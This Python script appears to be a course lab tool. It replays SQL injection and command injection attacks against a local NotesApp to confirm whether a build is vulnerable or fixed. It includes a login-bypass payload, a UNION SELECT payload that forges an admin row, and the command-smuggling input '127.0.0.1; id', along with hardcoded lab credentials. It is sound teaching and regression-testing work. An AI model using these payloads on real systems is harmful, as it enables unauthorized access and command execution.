"""Replay the Class 9 injections against a running NotesApp.

Two checks, both from docs/class9/injection.md:

  * SQL injection on POST /login (flaw #8). This repository's login no longer
    glues the password into the sentence (Class 5 moved the verification to
    Python/Argon2id), so the lab's literal ``admin' -- `` payload only proves
    that the password clause is gone. The login is still injectable because the
    username is concatenated; the replay forges a row with UNION and a password
    the caller chooses. On the vulnerable build that login also rewrites
    admin's password hash, so the SQLi probe runs LAST.
  * Command injection on POST /admin/ping (flaw #9), with a real admin session.

Usage:
    python class09/replay/injection.py --base http://localhost:8080 --expect fixed
    python class09/replay/injection.py --base http://localhost:8081 --expect vulnerable

The script exits non-zero unless every observation matches the expected build.
It only touches the accounts and notes of this disposable lab database.
"""

import argparse
import http.cookiejar
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

PING_HOST = "127.0.0.1"
PLAIN_PING = "127.0.0.1"
CMDI_PAYLOAD = "127.0.0.1; id"
CMDI_MARKER = "uid=0("

# The lab's literal payload, kept for the record: on this revision the password
# check happens outside SQL, so this input returns admin's row and is then
# refused by the Python verification.
LAB_SQLI_PAYLOAD = "admin' -- "

# The payload that still authenticates the pre-fix build: a UNION row whose
# password column is the string the caller also sends as the password.
UNION_SQLI_PAYLOAD = "zzz' UNION SELECT 1,'admin','admin','anything' -- "
UNION_PASSWORD = "anything"


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def _opener():
    jar = http.cookiejar.CookieJar()
    return urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(jar), _NoRedirect()
    )


def _request(opener, url, data=None):
    body = urllib.parse.urlencode(data).encode() if data is not None else None
    request = urllib.request.Request(url, data=body)
    try:
        with opener.open(request, timeout=15) as response:
            return response.status, response.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as error:
        return error.code, error.read().decode("utf-8", "replace")
    except urllib.error.URLError as error:
        raise SystemExit(f"cannot reach {url}: {error.reason}") from None


def _login(opener, base, username, password):
    return _request(opener, f"{base}/login",
                    {"username": username, "password": password})[0]


def _is_admin(opener, base):
    return _request(opener, f"{base}/admin")[0] == 200


def _ping(opener, base, host):
    status, body = _request(opener, f"{base}/admin/ping", {"host": host})
    match = re.search(r"(?s)<pre>(.*?)</pre>", body)
    text = match.group(1) if match else ""
    return status, text.replace("&amp;", "&").replace("&lt;", "<").replace("&gt;", ">")


def collect(base):
    """Return the observations as a list of (name, value) pairs."""
    observations = []

    # Run the literal lab payload first: the UNION probe below rewrites admin's
    # password on the vulnerable build, and a later lab probe would then be
    # judged against that mutated row instead of the seed one.
    lab = _opener()
    lab_code = _login(lab, base, LAB_SQLI_PAYLOAD, "anything")
    observations.append(("lab payload admin' -- returns a session", lab_code == 302))

    admin = _opener()
    admin_code = _login(admin, base, "admin", "admin123")
    observations.append(("real admin login (admin/admin123)", admin_code == 302))
    observations.append(("admin page opens for that session", _is_admin(admin, base)))

    _, plain = _ping(admin, base, PLAIN_PING)
    observations.append(("plain 127.0.0.1 ping works", "PING" in plain or "bytes from" in plain))

    _, injected = _ping(admin, base, CMDI_PAYLOAD)
    observations.append(("command injection prints uid=0(...)", CMDI_MARKER in injected))
    observations.append(("command injection text kept",
                         " | ".join(injected.strip().splitlines())[:140]))

    alice = _opener()
    alice_code = _login(alice, base, "alice", "alicepw")
    observations.append(("real student login (alice/alicepw)", alice_code == 302))

    # Last, because on the vulnerable build this login also rewrites admin's
    # password hash (the plaintext -> Argon2id upgrade runs on the row we supply).
    union = _opener()
    union_code = _login(union, base, UNION_SQLI_PAYLOAD, UNION_PASSWORD)
    observations.append(("UNION login returns a session", union_code == 302))
    observations.append(("UNION login opens the admin page", _is_admin(union, base)))

    return observations, injected


def main():
    parser = argparse.ArgumentParser(description="Replay the Class 9 injections")
    parser.add_argument("--base", default="http://localhost:8080")
    parser.add_argument("--expect", choices=("vulnerable", "fixed"), required=True)
    args = parser.parse_args()
    base = args.base.rstrip("/")

    observations, injected = collect(base)
    values = dict(observations)

    if args.expect == "vulnerable":
        expected = {
            "real admin login (admin/admin123)": True,
            "admin page opens for that session": True,
            "plain 127.0.0.1 ping works": True,
            "command injection prints uid=0(...)": True,
            "real student login (alice/alicepw)": True,
            "UNION login returns a session": True,
            "UNION login opens the admin page": True,
            # Informational for this revision: the password clause is not in SQL.
            "lab payload admin' -- returns a session": False,
        }
    else:
        expected = {
            "real admin login (admin/admin123)": True,
            "admin page opens for that session": True,
            "plain 127.0.0.1 ping works": True,
            "command injection prints uid=0(...)": False,
            "real student login (alice/alicepw)": True,
            "UNION login returns a session": False,
            "UNION login opens the admin page": False,
            "lab payload admin' -- returns a session": False,
        }

    print("=" * 68)
    print(f"NotesApp Class 9 injection replay (flaws #8 and #9)")
    print(f"target : {base}")
    print(f"expect : {args.expect} build")
    print("=" * 68)
    print()
    failures = 0
    for name, observed in observations:
        if name not in expected:
            print(f"  info   {name}: {observed}")
            continue
        want = expected[name]
        if observed == want:
            mark = "MATCH "
        elif isinstance(observed, bool):
            mark = "DIFFER"
            failures += 1
        else:
            mark = "info  "
        print(f"  {mark} {name:44s} observed {str(observed):5s} expected {str(want)}")
    print()
    print(f"  admin ping reply on the injection payload: {injected.strip()[:160]!r}")
    print()

    if failures:
        print(f"VERDICT: {failures} observation(s) differ from the expected {args.expect} build")
        return 1
    print(f"VERDICT: matches the expected behaviour for the {args.expect} build")
    if args.expect == "vulnerable" and values.get("UNION login opens the admin page"):
        print("NOTE: on the vulnerable build this replay ends by rewriting admin's")
        print("      password hash (the plaintext->Argon2id upgrade runs on the row")
        print("      the UNION supplied). Restart the stack for a clean seed.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
